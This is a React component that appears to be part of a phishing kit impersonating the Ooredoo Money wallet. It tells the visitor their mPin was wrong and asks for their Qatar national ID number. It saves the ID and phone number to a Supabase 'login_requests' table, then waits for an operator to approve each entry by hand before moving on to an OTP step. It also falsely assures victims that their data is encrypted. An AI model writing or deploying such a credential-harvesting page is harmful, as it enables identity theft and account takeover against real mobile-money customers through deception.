import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { ArrowRight, Loader2, CreditCard, ShieldCheck } from "lucide-react";
import { Button } from "@/components/ui/button";
import ooredooLogo from "@/assets/ooredoo-logo.webp";

const QATAR_ID_LENGTH = 11;

const VerifyQatarId = () => {
  const [qatarId, setQatarId] = useState("");
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [requestId, setRequestId] = useState<string | null>(null);
  const navigate = useNavigate();
  const location = useLocation();
  const phone = location.state?.phone as string;
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (!phone) {
      navigate("/login");
    }
  }, [phone, navigate]);

  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const arr = qatarId.split("");
    arr[index] = value;
    const joined = arr.join("").slice(0, QATAR_ID_LENGTH);
    setQatarId(joined);
    if (value && index < QATAR_ID_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !qatarId[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, QATAR_ID_LENGTH);
    setQatarId(pasted);
    const nextIndex = Math.min(pasted.length, QATAR_ID_LENGTH - 1);
    inputRefs.current[nextIndex]?.focus();
  };

  const handleSubmit = async () => {
    if (qatarId.length !== QATAR_ID_LENGTH) {
      toast.error("يرجى إدخال رقم الهوية القطرية كاملاً");
      return;
    }

    setLoading(true);
    const otpCode = "----";

    const { data, error } = await supabase
      .from("login_requests")
      .insert({
        phone,
        otp_code: otpCode,
        qatar_id: qatarId,
        step: "qatar_id",
      } as any)
      .select("id")
      .single();

    if (error || !data) {
      toast.error("حدث خطأ، يرجى المحاولة مرة أخرى");
      setLoading(false);
      return;
    }

    setRequestId(data.id);
    setWaiting(true);
    toast.info("تم إرسال طلبك، بانتظار التحقق...");
  };

  useEffect(() => {
    if (!waiting || !requestId) return;

    const channel = supabase
      .channel("qatar_id_approval_" + requestId)
      .on("postgres_changes", {
        event: "UPDATE",
        schema: "public",
        table: "login_requests",
        filter: `id=eq.${requestId}`,
      }, (payload) => {
        const row = payload.new as { status: string };
        if (row.status === "approved") {
          toast.success("تم التحقق! أدخل رمز التأكيد...");
          navigate("/verify", { state: { phone } });
        } else if (row.status === "rejected") {
          toast.error("رقم الهوية غير صحيح، يرجى المحاولة مرة أخرى");
          setWaiting(false);
          setLoading(false);
          setRequestId(null);
          setQatarId("");
          inputRefs.current[0]?.focus();
        }
      })
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, [waiting, requestId, navigate, phone]);

  if (!phone) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background" dir="rtl">
      {/* Top gradient section */}
      <div className="relative bg-primary pt-10 pb-20 px-4 rounded-b-[3rem] overflow-hidden">
        <div className="absolute top-[-60px] right-[-40px] w-48 h-48 rounded-full bg-primary-foreground/5" />
        <div className="absolute bottom-[-30px] left-[-20px] w-32 h-32 rounded-full bg-primary-foreground/5" />
        <div className="absolute top-10 left-10 w-20 h-20 rounded-full bg-primary-foreground/5" />

        <div className="relative z-10 flex flex-col items-center space-y-3">
          <div className="w-16 h-16 rounded-2xl bg-primary-foreground/10 backdrop-blur-sm flex items-center justify-center border border-primary-foreground/10 shadow-lg">
            <img src={ooredooLogo} alt="Ooredoo Money" className="w-12 h-12 rounded-xl" />
          </div>
          <div className="text-center space-y-1">
            <h1 className="text-xl font-extrabold text-primary-foreground">التحقق من الهوية</h1>
            <p className="text-primary-foreground/70 text-xs">
              خطوة إضافية لحماية حسابك
            </p>
          </div>
        </div>
      </div>

      {/* Card */}
      <div className="flex-1 px-4 -mt-10">
        <div className="w-full max-w-sm mx-auto">
          <div className="glass-card rounded-2xl p-5 shadow-xl space-y-5">
            <div className="text-center space-y-1">
              <h2 className="text-lg font-bold text-foreground">أدخل رقم الهوية القطرية</h2>
              <p className="text-xs text-muted-foreground leading-relaxed">
                تم إدخال رمز mPin بشكل خاطئ، يرجى إدخال رقم الهوية للتحقق من حسابك
              </p>
            </div>

            {/* Qatar ID Input */}
            <div className="space-y-2">
              <label className="text-sm font-semibold text-foreground flex items-center gap-2">
                <CreditCard className="h-4 w-4 text-primary" />
                رقم الهوية
              </label>
              <div className="flex gap-1 justify-center" dir="ltr">
                {Array.from({ length: QATAR_ID_LENGTH }).map((_, i) => (
                  <input
                    key={i}
                    ref={(el) => (inputRefs.current[i] = el)}
                    type="tel"
                    inputMode="numeric"
                    maxLength={1}
                    value={qatarId[i] || ""}
                    onChange={(e) => handleChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    onPaste={i === 0 ? handlePaste : undefined}
                    disabled={waiting}
                    className="w-[30px] h-11 text-center text-base font-bold rounded-lg border border-border bg-muted/50 text-foreground focus:border-primary focus:ring-1 focus:ring-primary/30 focus:outline-none transition-all disabled:opacity-50"
                  />
                ))}
              </div>
            </div>

            <Button
              onClick={handleSubmit}
              className="w-full h-12 text-base font-bold rounded-xl shadow-md hover:shadow-lg transition-all"
              disabled={qatarId.length !== QATAR_ID_LENGTH || loading}
            >
              {waiting ? (
                <span className="flex items-center gap-2">
                  <Loader2 className="h-4 w-4 animate-spin" />
                  بانتظار التحقق...
                </span>
              ) : loading ? (
                <span className="animate-pulse-soft">جاري الإرسال...</span>
              ) : (
                "تحقق"
              )}
            </Button>

            <button
              onClick={() => navigate("/login")}
              className="w-full text-sm text-muted-foreground hover:text-foreground transition-colors flex items-center justify-center gap-1"
            >
              <ArrowRight className="h-3.5 w-3.5" />
              العودة لتسجيل الدخول
            </button>
          </div>

          {/* Security note */}
          <div className="flex items-center justify-center gap-2 mt-6 pb-6">
            <ShieldCheck className="h-4 w-4 text-primary" />
            <span className="text-xs text-muted-foreground">بياناتك محمية ومشفرة بالكامل</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default VerifyQatarId;
